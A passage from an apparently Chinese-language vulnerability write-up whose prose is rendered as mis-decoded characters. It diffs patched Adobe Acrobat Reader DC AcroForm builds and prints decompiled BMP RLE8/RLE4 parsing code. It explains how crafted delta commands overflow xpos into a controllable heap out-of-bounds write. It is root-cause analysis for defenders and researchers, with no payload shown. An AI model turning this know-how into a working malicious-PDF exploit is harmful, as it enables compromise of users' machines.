RLE4 ç¼–ç </h4><p>RLE4 å‹ç¼©ç®—æ³•ç”¨äºå‹ç¼© 4 ä½ä½å›¾ï¼ˆå³æ¯ä¸ªåƒç´ å ç”¨åŠå­—èŠ‚ç©ºé—´ï¼‰ã€‚RLE4 å‹ç¼©åçš„æ•°æ®å¯ä»¥å¤„äº <strong>ç¼–ç æ¨¡å¼ï¼ˆEncoded Modeï¼‰</strong> å’Œ <strong>ç»å¯¹æ¨¡å¼ï¼ˆAbsolute Modeï¼‰</strong> ä¸­çš„ä»»æ„ä¸€ç§ï¼ˆä¸¤ç§æ¨¡å¼åœ¨åŒä¸€ä¸ªä½å›¾ä¸­å¯ä»¥åŒæ—¶å‡ºç°ï¼‰ã€‚</p><p><strong>ç¼–ç æ¨¡å¼</strong> åŒ…å«ä¸¤å­—èŠ‚æ•°æ®ï¼š</p><ul><li><p>å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ä¸ºé›¶ï¼Œå…¶å«ä¹‰ä¸ºç¬¬äºŒä¸ªå­—èŠ‚å±•å¼€åå¾—åˆ°çš„åƒç´ ä¸ªæ•°</p><ul><li>ç¬¬äºŒä¸ªå­—èŠ‚ä»£è¡¨äº†ä¸¤ä¸ªåƒç´ çš„è‰²å½©ç´¢å¼•</li><li>é«˜ 4 ä½ä»£è¡¨ç¬¬ä¸€ä¸ªåƒç´ çš„è‰²å½©ç´¢å¼•</li><li>ä½ 4 ä½ä»£è¡¨ç¬¬äºŒä¸ªåƒç´ çš„è‰²å½©ç´¢å¼•</li><li>äºŒè€…ä¾æ¬¡äº¤æ›¿é‡å¤ï¼Œç›´åˆ°å¾—åˆ°ç¬¬ä¸€ä¸ªå­—èŠ‚æŒ‡å®šçš„åƒç´ ä¸ªæ•°</li></ul></li><li><p>å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºé›¶ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå­—èŠ‚çš„å¯èƒ½å«ä¹‰å¦‚ä¸‹</p><ul><li>0x00 è¡¨ç¤ºå½“å‰è¡Œå·²ç»ç»“æŸ</li><li>0x01 è¡¨ç¤ºä½å›¾è§£æå®Œæ¯•</li><li>0x02 è¡¨ç¤ºæ¥ä¸‹æ¥çš„ä¸¤ä¸ªå­—èŠ‚ <code>(deltaX, deltaY)</code> ä¸ºå½“å‰åæ ‡ <code>(x, y)</code> éœ€è¦ç§»åŠ¨çš„è·ç¦»</li></ul></li></ul><p>åœ¨ <strong>ç»å¯¹æ¨¡å¼</strong> ä¸­ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºé›¶ï¼Œç¬¬äºŒä¸ªå­—èŠ‚ä½äºåŒºé—´ <code>[0x03, 0xFF]</code> ã€‚ç¬¬äºŒä¸ªå­—èŠ‚è¡¨ç¤ºæ¥ä¸‹æ¥ç‰¹å®šæ•°é‡çš„ <strong>åŠå­—èŠ‚</strong> æ˜¯æœªå‹ç¼©çš„æ•°æ®ï¼ˆæ•°æ®é‡éœ€è¦æŒ‰ <code>WORD</code> å¯¹é½ï¼‰ã€‚</p><p>ä¸‹é¢ä¸º RLE4 å‹ç¼©ä¹‹åçš„æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>ä¸‹é¢ä¸ºè§£å‹ä¹‹åçš„æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h2 id="0x04-æ¼æ´åˆ†æ"><a href="#0x04-æ¼æ´åˆ†æ" class="headerlink" title="0x04. æ¼æ´åˆ†æ"></a>0x04. æ¼æ´åˆ†æ</h2><h3 id="4-1-ä»£ç å®šä½"><a href="#4-1-ä»£ç å®šä½" class="headerlink" title="4.1 ä»£ç å®šä½"></a>4.1 ä»£ç å®šä½</h3><p>æ ¹æ® ZDI ç½‘ç«™ä¸Šçš„å…¬å‘Šä¿¡æ¯ï¼Œå¯çŸ¥æ¼æ´ä½äº <strong>AcroForm</strong> æ¨¡å—ã€‚è¯¥æ¨¡å—æ˜¯ Adobe Acrobat Reader DC ä¸­è´Ÿè´£å¤„ç† <a href="https://en.wikipedia.org/wiki/XFA" target="_blank" rel="noopener">XFA è¡¨å•</a> çš„æ’ä»¶ï¼Œå…¶è·¯å¾„å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api</span><br></pre></td></tr></table></figure><p>é€šå¸¸æ¥è¯´ï¼Œå€ŸåŠ© <a href="https://www.zynamics.com/bindiff.html" target="_blank" rel="noopener">BinDiff</a> è¿›è¡Œè¡¥ä¸å¯¹æ¯”åˆ†æå¯ä»¥å¿«é€Ÿå®šä½åˆ°æœ‰æ¼æ´çš„å‡½æ•°ï¼Œä½†å¦‚æœæ–°æ—§ç‰ˆæœ¬çš„äºŒè¿›åˆ¶æ–‡ä»¶å˜åŠ¨æ¯”è¾ƒå¤§çš„è¯å°±ä¸å¤ªå¥½å¤„ç†äº†ï¼Œæ¨¡å— <code>AcroForm.api</code> çš„æƒ…å†µä¾¿æ˜¯å¦‚æ­¤ï¼šé€šè¿‡å¯¹æ¯”å‘ç°æœ‰å¤§é‡å‡½æ•°è¿›è¡Œäº†æ”¹åŠ¨ï¼Œä¸€ä¸ªä¸€ä¸ªå»çœ‹æ˜¾ç„¶ä¸å¤ªç°å®ã€‚</p><p>ç¬”è€…ç”¨äºå®šä½æ¼æ´å‡½æ•°çš„æ–¹æ³•å¦‚ä¸‹ï¼ˆä»¥ <code>2019.012.20035</code> ä¸ºä¾‹ï¼‰ï¼š</p><ol><li>åœ¨ <code>IDA</code> ä¸­æœç´¢å­—ç¬¦ä¸² <code>PNG</code> ï¼Œåœ¨ <code>.rdata:20F9A374</code> æ‰¾åˆ°ä¸€å¤„å®šä¹‰</li><li>å¯¹ <code>20F9A374</code> è¿›è¡Œäº¤å‰å¼•ç”¨æŸ¥æ‰¾ï¼Œå®šä½åˆ°å‡½æ•° <code>sub_20CF3A3F</code> </li><li>å¾ˆæ˜¾ç„¶å‡½æ•° <code>sub_20CF3A3F</code> è´Ÿè´£åˆ¤æ–­å›¾ç‰‡çš„ç±»å‹ï¼ˆä»è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡º XFA è¡¨å•æ‰€æ”¯æŒçš„å›¾ç‰‡æ ¼å¼ç±»å‹ï¼‰</li><li>å¯¹ <code>sub_20CF3A3F</code> è¿›è¡Œäº¤å‰å¼•ç”¨æŸ¥æ‰¾ï¼Œå®šä½åˆ°å‡½æ•° <code>sub_20CF4BE8</code> </li><li>å‡½æ•° <code>sub_20CF4BE8</code> æ ¹æ®å›¾ç‰‡çš„ç±»å‹è°ƒç”¨ä¸åŒçš„å¤„ç†å‡½æ•°</li><li>å‡½æ•° <code>sub_20CF4870</code>ï¼ˆè·³è½¬è‡ª <code>sub_20CF3E5F</code>ï¼‰è´Ÿè´£å¤„ç† <code>BMP</code> ä½å›¾</li></ol><p>åœ¨ BinDiff çš„ç»“æœä¸­å¯ä»¥çœ‹åˆ°ï¼Œå‡½æ•° <code>sub_20CF3E5F</code> ä¸­ç¡®å®æœ‰å‡ ä¸ªåŸºæœ¬å—å‘ç”Ÿäº†å˜åŠ¨ï¼Œæ¯”å¦‚ <code>20CF440F</code> å¤„çš„åŸºæœ¬å—çš„å˜åŠ¨æƒ…å†µå¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F in AcroForm 2019.012.20035</span></span><br><span class="line"><span class="keyword">if</span> ( v131 &gt;= v26 || (<span class="keyword">unsigned</span> __int8)v127 + v43 &gt; v123 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">v56 = (<span class="keyword">unsigned</span> __int8)v130 + v43;</span><br><span class="line"><span class="keyword">if</span> ( v134 &gt;= v26 || v56 &gt; v126 || v56 &lt; v43 || v56 &lt; (<span class="keyword">unsigned</span> __int8)v130 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œå¢åŠ äº†å¯¹æ•´æ•°æº¢å‡ºçš„åˆ¤æ–­ã€‚</p><h3 id="4-2-æ¼æ´åˆ†æ"><a href="#4-2-æ¼æ´åˆ†æ" class="headerlink" title="4.2 æ¼æ´åˆ†æ"></a>4.2 æ¼æ´åˆ†æ</h3><p>å¥½åœ¨ç½‘ä¸Šå·²ç»æœ‰äº†é’ˆå¯¹ CVE-2013-2729 çš„è¯¦ç»†åˆ†ææŠ¥å‘Šï¼ˆå‚è€ƒ <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliamâ€™s write up for CVE-2013-2729</a>ï¼‰ï¼ŒåŸºäºæ­¤å¯ä»¥å¿«é€Ÿç†è§£å‡½æ•° <code>sub_20CF3E5F</code> ä¸­ç›¸å…³ä»£ç çš„å«ä¹‰ã€‚</p><h4 id="4-2-1-RLE8-è§£æ"><a href="#4-2-1-RLE8-è§£æ" class="headerlink" title="4.2.1 RLE8 è§£æ"></a>4.2.1 RLE8 è§£æ</h4><p>å‡½æ•° <code>sub_20CF3E5F</code> ä¸­è´Ÿè´£è§£æ RLE8 å‹ç¼©æ•°æ®çš„éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">1</span> )  <span class="comment">// RLE8 ç®—æ³•</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, ä»å·¦å¾€å³</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, ä»ä¸‹å¾€ä¸Š</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// è¯»å– 2 å­—èŠ‚æ•°æ®</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                         <span class="comment">// ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ä¸ºé›¶</span></span><br><span class="line">      &#123;                                         <span class="comment">// è¡¨ç¤ºæœ‰å‹ç¼©æ•°æ®ç­‰å¾…å¤„ç†</span></span><br><span class="line">        <span class="comment">// 20CF440F å˜åŠ¨çš„åŸºæœ¬å—ä¹‹ä¸€</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            line[xpos++] = BYTE1(cmd);</span><br><span class="line">            ++index;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// å±•å¼€æ•°æ®</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )        <span class="comment">// ç¬¬ä¸€å­—èŠ‚ä¸ºé›¶ä¸”ç¬¬äºŒå­—èŠ‚ä¸ä¸ºé›¶</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )      <span class="comment">// ä½å›¾ç»“æŸ</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta æ•°æ®</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;           <span class="comment">// å‘å³ç§»åŠ¨</span></span><br><span class="line">          ypos -= ydelta;           <span class="comment">// å‘ä¸Šç§»åŠ¨</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">// æœªå‹ç¼©æ•°æ®</span></span><br><span class="line">        &#123;</span><br><span class="line">          dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">               dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// æ•´æ•°æº¢å‡ºæ£€æŸ¥</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">              line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              line[xpos++] = value;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              ++index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( index &lt; BYTE1(cmd) );   <span class="comment">// è¯»å–æœªå‹ç¼©æ•°æ®</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( count &amp; <span class="number">1</span> )                  <span class="comment">// æ•°æ®å¯¹é½</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// å½“å‰è¡Œç»“æŸ</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// ä»ä¸‹å¾€ä¸Šç§»åŠ¨ä¸€è¡Œ</span></span><br><span class="line">        xpos = <span class="number">0</span>;                           <span class="comment">// ç§»åŠ¨åˆ°è¡Œçš„èµ·ç‚¹</span></span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸºäºå‰é¢çš„è¡¥ä¸åˆ†æï¼Œå¾ˆæ˜æ˜¾ä¸‹é¢çš„ <code>if</code> è¯­å¥ä¸­å­˜åœ¨æ•´æ•°æº¢å‡ºï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F å˜åŠ¨çš„åŸºæœ¬å—ä¹‹ä¸€</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F AcroForm 2019.012.20036 ä¸­ä¿®å¤çš„åŸºæœ¬å—</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width || </span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨è®¡ç®— <code>(unsigned __int8)cmd + xpos</code> æ—¶å¯èƒ½å¯¼è‡´æ•´æ•°æº¢å‡ºï¼Œä¸”å…¶ä¸­ä¸¤ä¸ªå˜é‡çš„å€¼éƒ½å¯ä»¥è¢«æ§åˆ¶ã€‚åœ¨è§£æç‰¹å®šçš„ RLE8 æ•°æ®æ—¶ï¼Œå¦‚æœè§¦å‘è¿™é‡Œçš„æ•´æ•°æº¢å‡ºï¼Œåç»­ä¾¿å¯ä»¥å®ç°å †å—è¶Šç•Œå†™ã€‚</p><ol><li>å˜é‡ <code>(unsigned __int8)cmd</code> çš„å€¼æ˜¯å¯ä»¥ç›´æ¥æ§åˆ¶çš„ï¼Œå…¶å–å€¼èŒƒå›´ä¸º <code>[1, 255]</code> </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// è¯»å– 2 å­—èŠ‚æ•°æ®</span></span><br></pre></td></tr></table></figure><ol start="2"><li>å˜é‡ <code>xpos</code> çš„å€¼ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥æ§åˆ¶çš„ï¼Œåªéœ€è¦åœ¨ <strong>ç¼–ç æ¨¡å¼</strong> ä¸­å¸ƒå±€å¤§é‡ <code>delta</code> å‘½ä»¤å³å¯ä½¿å¾— <code>xpos</code> çš„å€¼æ¥è¿‘ <code>0xFFFFFFFF</code> </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">&#123;</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">  xpos += xdelta;           <span class="comment">// å‘å³ç§»åŠ¨, xdelta å–å€¼èŒƒå›´ä¸º [0, 255]</span></span><br><span class="line">  ypos -= ydelta;           <span class="comment">// å‘ä¸Šç§»åŠ¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>å› ä¸º <code>xpos</code> éå¸¸å¤§ï¼ˆæœ‰ç¬¦å·è¡¨ç¤ºä¸ºè´Ÿæ•°ï¼‰ï¼Œå› æ­¤åœ¨å¤„ç† RLE8 å‹ç¼©æ•°æ®æ—¶å¯ä»¥å®ç°å †å—è¶Šç•Œå†™ï¼ˆå¾€ä½åœ°å€æ–¹å‘è¶Šç•Œå†™ï¼‰ï¼Œå¹¶ä¸”å†™çš„æ•°æ®ä¹Ÿæ˜¯å®Œå…¨å¯æ§çš„ï¼Œåªä¸è¿‡æ‰€æœ‰æ•°æ®éƒ½å¿…é¡»æ˜¯åŒæ ·çš„å€¼</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// å¯æ§æ•°æ®å®ç°å †å—è¶Šç•Œå†™</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// è§£å‹æ•°æ®</span></span><br></pre></td></tr></table></figure><h4 id="4-2-2-RLE4-è§£æ"><a href="#4-2-2-RLE4-è§£æ" class="headerlink" title="4.2.2 RLE4 è§£æ"></a>4.2.2 RLE4 è§£æ</h4><p>å‡½æ•° <code>sub_20CF3E5F</code> ä¸­è´Ÿè´£è§£æ RLE4 å‹ç¼©æ•°æ®çš„éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼ˆå®ç° RLE4 è§£å‹çš„ä»£ç æ¯” RLE8 è§£å‹çš„ä»£ç ç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œå› ä¸ºæ•°æ®å•ä½ä¸å†æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œæ˜¯åŠä¸ªå­—èŠ‚ï¼‰ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">2</span> )  <span class="comment">// RLE4 ç®—æ³•</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, ä»å·¦å¾€å³</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, ä»ä¸‹å¾€ä¸Š</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  odd_index_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fn_feof(v1[<span class="number">2</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);       <span class="comment">// è¯»å– 2 å­—èŠ‚æ•°æ®</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                     <span class="comment">// ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ä¸ºé›¶</span></span><br><span class="line">      &#123;                                     <span class="comment">// è¡¨ç¤ºæœ‰å‹ç¼©æ•°æ®ç­‰å¾…å¤„ç†</span></span><br><span class="line">        high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// é«˜ 4 ä½æ•°æ®</span></span><br><span class="line">        low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// ä½ 4 ä½æ•°æ®</span></span><br><span class="line">        <span class="comment">// 20CF45F8 å˜åŠ¨çš„åŸºæœ¬å—ä¹‹ä¸€</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          xpos_ = odd_index_;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            odd_index = index &amp; <span class="number">1</span>;</span><br><span class="line">            line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            _4bits = high_4bits;            <span class="comment">// å¶æ•°ç´¢å¼• -&gt; é«˜ 4 ä½æ•°æ®</span></span><br><span class="line">            <span class="keyword">if</span> ( odd_index )                <span class="comment">// å¥‡æ•°ç´¢å¼• -&gt; 